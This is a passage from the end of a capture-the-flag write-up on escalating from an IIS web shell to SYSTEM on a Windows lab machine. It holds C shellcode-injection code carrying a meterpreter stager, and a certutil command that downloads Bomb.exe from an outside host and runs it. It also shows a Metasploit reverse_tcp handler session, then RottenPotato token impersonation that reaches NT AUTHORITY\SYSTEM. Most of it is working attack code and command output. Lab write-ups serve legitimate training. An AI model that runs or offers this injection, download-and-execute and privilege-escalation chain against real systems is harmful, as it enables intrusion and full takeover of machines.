0x49,0x86,0x21,0xed,0xc2,0x4a,0x80,0x4e,0x1f,0x9f,0xe4,0x70,0x1e,0x89,0xad,
0xf9,0x46,0x7d,0xaf,0x16,0x26,0x7f,0xaf,0xe6,0x6f,0x09,0x4a,0xaf,0xd3,0x0b,
0x95,0x31,0x90,0x06,0x9e,0x3d,0xfc,0x57,0xf4,0x74,0x89,0xbc,0xb8,0x0f,0x78,
0x7d,0xfb,0x5c,0x0d,0x58,0xfc,0xa3,0x24,0xe8,0x8b,0xb6,0xae,0xf0,0x8a,0x46,
0x2e,0xaa,0xcd,0xfc,0x07,0xcc,0xa5,0x00,0xa8,0x19,0x53,0x0b,0x17,0xfc,0xf4,
0x5b,0xda,0x31,0x3c,0x16,0xd5,0xf1,0xf6,0x56,0xd5,0xba,0x8f,0x6b,0x9d,0xc5,
0x50,0x23,0x94,0xfb,0x10,0x0e,0x4c,0xf4,0x4d,0x8e,0x6f,0xde,0x3a,0xc6,0x48,
0x8b,0xaa,0x99,0x0e,0x00,0x42,0xfb,0xe6,0x11,0xad,0xbd,0x4c,0xb8,0xeb,0x4a,
0xd1,0x44,0x26,0x37,0xd1,0xcf,0xc5,0x71,0x2e,0xe1,0xa3,0x64,0xb8,0x0e,0xfe,
0xc5,0x6e,0x10,0xd4,0x42,0x0d,0x02,0xc7,0x1a,0x98,0x39,0xa5,0xab,0x53,0xd7,
0x32,0x8d,0x3b,0x60,0xb2,0xf4,0xfa,0xca,0xc6,0xdf,0x34,0x75,0x38,0x0a,0x8c,
0x09,0x02,0x95,0x52,0x87,0x7d,0xbc,0x2a,0xd6,0xd8,0x29,0xaa,0xc8,0xda,0xa9,
0xeb,0xb0,0x92,0x20,0x19,0x08,0x12,0xfa,0x9c,0x33,0x0c,0x58,0x4d,0xa1,0x52,
0x75,0x39,0xa0,0x6e,0x3f,0x30,0x75,0x3d,0xf1,0x8b,0x33,0x37,0x01,0x43,0x4d,
0x9d,0xaa,0xda,0xb4,0x63,0x91,0xde,0x9f,0xac,0xba,0x21,0xca,0x65,0x44,0x1e,
0xbd,0x5c,0x80,0xe8,0xbb,0x69,0x79,0x09,0x82,0x6a,0x65 };
	DWORD pid;
	pid = CreateDecoyProcess();
	if (!pid) return 1;
	InjectShellcode(shellcode, szShellcode, pid);
    return 0;
}
```

This will inject meterpreter stager to a remote process and execute it, so we are able to get a meterpreter session.

```powershell
PS C:\windows\system32\inetsrv> cd \windows\temp
PS C:\windows\temp> cmd.exe /c certutil.exe -urlcache -split -f http://10.11.12.26:80/Bomb.exe c:\windows\temp\bomb1.exe
****  Online  ****
  000000  ...
  020c00
CertUtil: -URLCache command completed successfully.
PS C:\windows\temp> cmd.exe /c c:\windows\temp\bomb1.exe
```

Then we get our meterpreter session over our metasploit handler.

```cmd
msf > handler -p windows/x64/meterpreter/reverse_tcp -H tun0 -P 443
[*] Payload handler running as background job 0.

[*] [2018.09.16-15:13:49] Started reverse TCP handler on 10.11.12.26:443 
msf exploit(multi/handler) > 
[*] [2018.09.16-15:14:07] Encoded stage with x64/xor
[*] [2018.09.16-15:14:07] Sending encoded stage (206447 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (10.11.12.26:443 -> 192.168.56.100:49187) at 2018-09-16 15:14:08 -0700
[*] AutoAddRoute: Routing new subnet 10.11.12.0/255.255.255.0 through session 1
[*] AutoAddRoute: Routing new subnet 192.168.56.0/255.255.255.0 through session 1
[-] The 'stdapi' extension has already been loaded.
meterpreter > 
```

Now it is just a matter of uploading RottenPotato.exe over C:\windows\temp, executing it and impersonate token privileges to get SYSTEM user.

```cmd
meterpreter > cd \\windows\\temp
meterpreter > upload /mnt/hgfs/andre/ownCloud/auto/pentest/windows/exploits/RottenPotato .
[*] uploading  : /mnt/hgfs/andre/ownCloud/auto/pentest/windows/exploits/RottenPotato/README.md -> .\README.md
[*] uploaded   : /mnt/hgfs/andre/ownCloud/auto/pentest/windows/exploits/RottenPotato/README.md -> .\README.md
[*] uploading  : /mnt/hgfs/andre/ownCloud/auto/pentest/windows/exploits/RottenPotato/rottenpotato.exe -> .\rottenpotato.exe
[*] uploaded   : /mnt/hgfs/andre/ownCloud/auto/pentest/windows/exploits/RottenPotato/rottenpotato.exe -> .\rottenpotato.exe
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
IIS APPPOOL\DefaultAppPool

Impersonation Tokens Available
========================================
NT AUTHORITY\IUSR

meterpreter > execute -f rottenpotato.exe 
Process 1896 created.
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

As you can see, we got SYTEM privileges over meterpreter, so we are now over with the challenge.

---


Hope you enjoyed the write-up.

Best regards,
__zc00l__
